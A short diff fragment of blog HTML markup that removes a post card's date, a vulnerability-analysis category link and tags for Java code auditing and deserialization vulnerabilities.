-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-02
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
-                                    漏洞分析
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                        <span class="chip bg-color">漏洞分析</span>
-                    </a>
-                    
-                    <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">Java代码审计</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">反序列化漏洞</span>
                     </a>
                     
                 </div>
